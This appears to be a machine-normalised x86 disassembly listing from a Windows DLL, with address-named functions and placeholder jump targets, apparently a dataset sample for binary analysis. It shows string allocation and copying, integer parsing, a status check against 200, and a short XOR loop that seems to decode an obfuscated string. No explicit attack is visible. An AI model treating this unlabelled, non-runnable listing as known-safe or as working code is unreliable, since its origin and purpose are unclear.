mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_1006d830
mov eax ebx
call sub_100262c3
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10042a70
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10042a70
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001f911
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov ebx [ ebp - 0x58 ]
sub_10052804
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10012468
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_10052840
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
cmp [ eax ] edx
je r-xdata
add [ esi + 0x10 ] 0xfffffff8
xor eax eax
pop esi
pop ebp
retn
lea ecx [ eax - 0x8 ]
push edi
lea esp [ esp ]
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
pop edi
sub_100528a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100850d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x64 ] 0x0
call sub_10047030
push edi
push esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_1003e2b0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x0
call sub_1000ab70
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10052923
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_10051cf5
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
push [ esi + ebx * 4 + 0x1c ]
call sub_1007fa40
push [ esi + ebx * 4 ]
mov [ ebp - 0x14 ] eax
call sub_1007fa40
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_1007fa40
push [ ebx ]
mov [ ebp - 0xc ] eax
call sub_1007fa40
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax edi
dec [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_1007fa40
push [ esi + 0x98 ]
mov ebx eax
call sub_1007fa40
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_1007fa40
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_1007fa40
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_1007fa40
lea eax [ edi + eax + 0x165 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_1005f1fb
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x164
push esi
push ebx
lea edi [ ebx + 0x164 ]
call sub_1007f580
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
push edi
call sub_1007fa40
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa40
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa40
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
push edi
call sub_1007fa40
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x14 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_1007fa40
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa40
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa40
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa40
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
sub_10052c10
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi edx
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0xa8 ] eax
lea eax [ esi + 0xc ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0xac ] esi
jb r-xdata
mov [ ebp - 0xa4 ] eax
mov ecx [ eax ]
mov [ ebp - 0xa4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xa4 ]
push ebx
push ecx
push eax
mov [ edi ] eax
call sub_1007f580
lea eax [ esi + 0x2c ]
add esp 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xa4 ] eax
mov edx [ eax ]
mov [ ebp - 0xa4 ] edx
jmp r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xa4 ]
push ebx
push edx
push eax
mov [ edi + 0x8 ] eax
call sub_1007f580
mov eax [ esi + 0x28 ]
mov [ edi + 0x20 ] eax
mov ecx [ esi + 0x58 ]
mov [ edi + 0x24 ] ecx
mov edx [ esi + 0x50 ]
mov [ edi + 0x2c ] edx
mov eax [ esi + 0x54 ]
mov [ edi + 0x28 ] eax
mov [ edi + 0x38 ] 0x1
mov ecx [ esi + 0x68 ]
mov [ edi + 0x40 ] ecx
mov edx [ esi + 0x6c ]
mov [ edi + 0x44 ] edx
mov eax [ esi + 0x5c ]
mov [ edi + 0x4c ] eax
mov ecx [ esi + 0x60 ]
mov [ edi + 0x48 ] ecx
mov eax [ esi + 0x48 ]
dec eax
add esp 0xc
cmp eax 0x5
ja r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xb4
call sub_1002f620
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_10052ed0 ]
lea edx [ ebp - 0x24 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov [ edi + 0x1c ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
lea edx [ ebp - 0x48 ]
mov eax 0x54
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x29
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xd7
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x1d
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0xf3
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x25
call sub_1002f620
mov ebx edx
call sub_10052090
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3b
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x26 ] ax
mov eax [ ebp - 0xa8 ]
mov ebx [ eax ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
mov edx [ esi + 0x58 ]
push edx
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0x18 ]
call sub_100450f0
mov eax esi
push eax
lea eax [ edi + 0x54 ]
call sub_10001ba0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] r--data
test eax eax
je r-xdata
mov ecx [ ebp - 0xa8 ]
add ebx 0x1c
cmp ebx [ ecx + 0x4 ]
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov esi [ ebp - 0xac ]
sub_10052ee8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005cc4d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10052f10
push ebp
mov ebp esp
push 0xffffffff
push sub_10086bb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2
mov esi ecx
xor ebx ebx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1003e780
mov [ ebp - 0x4 ] ebx
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov eax 0xf
mov esi 0x10
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x38 ] 0x8
cmp eax esi
jae r-xdata
mov [ ecx + 0x8 ] bl
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10004e10
cmp [ ebp - 0x34 ] esi
jb r-xdata
lea ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
push edi
push 0x1
push eax
call [ StrToIntExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov al 0x1
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10053010
push ebp
mov ebp esp
push 0xffffffff
push sub_10087895
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
cmp [ ebx + 0xec ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x1000
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x104 ] eax
jbe r-xdata
mov eax 0x42
jmp r-xdata
push 0x3
lea esi [ ebp - 0x100 ]
mov edi ebx
call sub_1006ff30
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x64 ] al
call sub_1003e780
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x100 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x64 ]
call sub_10017cc0
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
push r--data
call sub_100651be
push esi
push ebx
lea eax [ ebp - 0x100 ]
call sub_100215e0
mov ecx [ esi + 0x10 ]
mov edx [ ebx + 0x50 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x114 ] ecx
cmp edi 0x1
ja r-xdata
push r--data
call sub_100651be
mov eax [ esi + 0x2c ]
mov [ ebp - 0x110 ] eax
cmp edi 0x2
ja r-xdata
push r--data
call sub_100651be
mov ecx [ ebx + 0x108 ]
mov eax [ esi + 0x48 ]
add ecx 0x7
lea eax [ eax + ecx * 2 ]
add eax ecx
add eax [ ebp - 0x110 ]
mov ecx [ ebp + 0xc ]
add eax [ ebp - 0x114 ]
add eax edx
cmp ecx eax
ja r-xdata
push r--data
call sub_100651be
sub ecx eax
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x120 ] ecx
call sub_10015820
push eax
lea eax [ ebp - 0xd4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp eax 0x1
ja r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_1006cc80
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x100 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xd4 ]
call sub_10017cc0
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x114 ] eax
call sub_10051c40
push eax
lea edx [ ebp - 0xb8 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x5
call sub_100282d0
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xdc ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xdc ] 0xf
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0xf0 ] 0x0
cmp ecx 0x2
ja r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x100 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xb8 ]
call sub_10017cc0
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_100215e0
mov ecx [ ebp - 0x11c ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
mov [ ebp - 0x110 ] eax
call sub_10015820
mov esi eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x8
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x9
call sub_10069410
mov ecx eax
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xb
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xc
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x110 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xe
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xf
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x10
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x80 ]
push ecx
lea edi [ ebp - 0x100 ]
call sub_1001e5a0
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0x80 ]
xor edi edi
mov esi 0x10
mov [ ebp - 0x118 ] edi
cmp [ ebp - 0x6c ] esi
jae r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1000a86e
add esp 0x4
mov ebx [ ebx + 0xec ]
mov edx [ ebx ]
mov edx [ edx + 0x8 ]
lea ecx [ ebp - 0x108 ]
push ecx
lea ecx [ ebp - 0x104 ]
push ecx
lea ecx [ ebp - 0x118 ]
push ecx
mov ecx [ ebp - 0x70 ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx ebx
call edx
test eax eax
jne r-xdata
lea eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] 0x3
cmp [ ebp - 0x118 ] 0xc8
jne r-xdata
cmp [ ebp - 0x6c ] esi
jb r-xdata
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x104 ] edi
mov ecx [ ebp - 0x104 ]
cmp ecx edi
je r-xdata
mov ebx 0x10
mov esi 0xf
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] 0x0
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x10c ] 0x4
jmp r-xdata
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] 0x0
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp ecx edi
je r-xdata
mov eax [ ebp - 0x108 ]
mov dl [ eax + ecx - 0x1 ]
cmp dl 0xa
je r-xdata
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] 0x0
cmp [ ebp - 0x50 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ eax + ecx - 0x1 ] 0x0
mov eax [ ebp - 0x108 ]
mov ecx [ ebp - 0x104 ]
dec eax
mov [ ebp - 0x108 ] eax
cmp dl 0x20
jne r-xdata
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] 0x0
call sub_1006cc80
mov eax [ ebp - 0x10c ]
mov eax [ ebp - 0x64 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x120 ] eax
je r-xdata
push ecx
lea ecx [ ebp - 0x108 ]
call sub_100386b0
mov ecx [ ebp - 0x104 ]
mov eax [ ebp - 0x108 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x10c ] 0x5
jmp r-xdata
sub_10053809
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1003a0f4
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
